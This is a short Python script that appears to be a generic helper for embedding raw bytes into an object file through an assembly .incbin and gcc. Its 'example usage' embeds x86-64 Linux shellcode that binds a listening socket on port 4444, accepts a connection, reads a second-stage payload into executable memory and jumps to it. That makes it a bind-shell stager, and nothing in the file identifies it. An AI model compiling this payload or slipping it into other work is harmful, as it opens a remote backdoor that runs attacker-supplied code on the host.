import subprocess

def __asm_bytes(_raw: bytes, _file_name: str, _global_name: str):
    # Write raw bytes to a binary file
    bin_file = _file_name.replace(".s", ".bin")
    with open(bin_file, "wb") as f:
        f.write(_raw)

    # Create an assembly file that includes the binary file
    asm_content = f"""
    .global {_global_name}
    .section .text
{_global_name}:
    .incbin "{bin_file}"
    """
    with open(_file_name, "w") as f:
        f.write(asm_content)

    # Use GCC to assemble the binary and link it into an object file
    obj_file = _file_name.replace(".s", ".o")
    subprocess.run(["gcc", "-c", _file_name, "-o", obj_file], check=True)


# Example usage
buf = b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89"
buf += b"\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x59\x6a\x32"
buf += b"\x58\x0f\x05\x48\x96\x6a\x2b\x58\x0f\x05\x50\x56"
buf += b"\x5f\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31"
buf += b"\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x96\x48"
buf += b"\x97\x5f\x0f\x05\xff\xe6"

__asm_bytes(buf, "asm_action.s", "__asm_action")
